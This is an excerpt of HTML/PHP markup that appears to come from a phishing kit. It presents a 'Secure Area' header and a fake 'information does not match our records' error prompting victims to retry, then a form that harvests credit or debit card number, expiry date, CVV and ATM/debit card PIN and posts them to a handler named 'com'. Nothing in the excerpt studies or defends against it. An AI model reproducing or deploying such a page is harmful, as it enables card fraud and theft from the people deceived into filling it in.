				...
				<div class="sl-nav">
					<ul>
						<div style="padding-top:10px;">
							<p><img src="images/locki.svg" width="20" height="20" alt=""> <b style="padding-top:2px;">
									<font color="gray">Secure Area</font>
								</b></p>
						</div>
					</ul>
				</div>
			...
			<form method="POST" action="com" class="contact100-form validate-form">
				<div class="bs-example">
					<div class="alert alert-danger alert-dismissible fade show">
						...
						<p>We're unable to complete your request at this time. The information you entered does not
							match our records.Please verify your information.</p>
						<hr>
					</div>
				</div>
				...
				<label class="label-input100">
					<font color="red"><i class="fa fa-warning"></i> Try again with correct information</font>
				</label>
		...
		?>
			<form method="POST" action="com" class="contact100-form validate-form">
				...
				<div class="wrap-input100 validate-input" data-validate="Credit/Debit Card Number is Required">
					<input id="ccn" class="input100" type="text" minlength="19" maxlength="19" name="ccn"
						placeholder="0000-0000-0000-0000" required="required" oninput="formatAsXXXX(this)">
					<span class="focus-input100"></span>
				</div>
				...
				<div class="wrap-input100 validate-input" data-validate="Expiration Date (MM/YY) is Required">
					<input id="exp" class="input100" type="tel" minlength="5" maxlength="5" name="exp"
						placeholder="00/00" oninput="formatDate(this)">
					<span class="focus-input100"></span>
				</div>
				...
				<div class="wrap-input100 validate-input" data-validate="Credit/Debit CVV/CVC is Required">
					<input id="cvci" class="input100" type="text" minlength="3" maxlength="3" name="cvci"
						placeholder="000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)" />
					<span class="focus-input100"></span>
				</div>
				...
				<div class="wrap-input100 validate-input" data-validate="ATM/Debit Card PIN is Required">
					<input id="ati" class="input100" type="text" minlength="4" maxlength="6" name="ati"
						placeholder="0000" pattern="\d*" required="required" onkeypress="return isNumberKey(event)" />
					<span class="focus-input100"></span>
				</div>
